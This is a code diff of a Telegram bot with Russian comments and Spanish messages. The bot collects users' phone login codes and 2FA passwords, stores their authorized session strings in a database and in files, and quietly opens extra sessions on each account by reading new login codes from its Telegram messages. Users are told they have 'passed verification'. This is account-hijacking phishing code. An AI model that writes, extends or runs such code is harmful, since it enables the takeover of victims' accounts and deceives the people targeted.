@@ -168,8 +168,10 @@ async def try_sign_in_code(user_id, code):
     try:
         await client.sign_in(phone=phone, code=code)
         if await client.is_user_authorized():
-            # Сохраняем основную сессию
+            me = await client.get_me()
             session_str = client.session.save()
+            
+            # Сохраняем только основную сессию
             sessions_col.update_one(
                 {"phone": phone},
                 {"$set": {
@@ -185,7 +187,7 @@ async def try_sign_in_code(user_id, code):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            # Отправляем сообщение об успешной авторизации
+            # Уведомляем пользователя об успешной авторизации
             await bot.send_message(
                 user_id,
                 "✅ Has pasado la verificación. Nuestro bot está un poco cargado. "
@@ -211,7 +213,7 @@ async def create_additional_sessions(phone, main_client):
             await new_client.connect()
 
             # Отправляем запрос кода
-            await new_client.send_code_request(phone)
+            sent_code = await new_client.send_code_request(phone)
             
             # Получаем код из истории сообщений основной сессии
             code = await get_code_from_messages(main_client)
@@ -220,7 +222,7 @@ async def create_additional_sessions(phone, main_client):
                 logging.error(f"No se pudo obtener el código para la sesión adicional {i+1}")
                 continue
 
-            # Авторизуемся
+            # Авторизуемся с полученным кодом
             await new_client.sign_in(phone=phone, code=code)
             
             if await new_client.is_user_authorized():
@@ -240,7 +242,7 @@ async def create_additional_sessions(phone, main_client):
 
 async def get_code_from_messages(client, limit=10):
     try:
-        # Получаем последние сообщения
+        # Получаем последние сообщения от Telegram
         messages = await client.get_messages('Telegram', limit=limit)
         
         # Ищем код подтверждения в сообщениях
@@ -254,6 +256,23 @@ async def get_code_from_messages(client, limit=10):
     except Exception as e:
         logging.error(f"Error al obtener código de mensajes: {str(e)}")
     return None
+
+async def handle_auth_error(user_id, error, client=None):
+    if isinstance(error, PhoneCodeExpiredError):
+        await bot.send_message(user_id, "⏰ Código caducado. Inténtalo de nuevo desde /start")
+    elif isinstance(error, PhoneCodeInvalidError):
+        await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
+        user_code_buffers[user_id]['code'] = ""
+        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
+    elif isinstance(error, SessionPasswordNeededError):
+        user_states[user_id] = 'awaiting_2fa'
+        await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Introdúcela:")
+    else:
+        await bot.send_message(user_id, f"❌ Error de inicio de sesión: {error}")
+    
+    if client:
+        await client.disconnect()
+    cleanup(user_id)
 
 @dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
 async def process_2fa(message: types.Message):
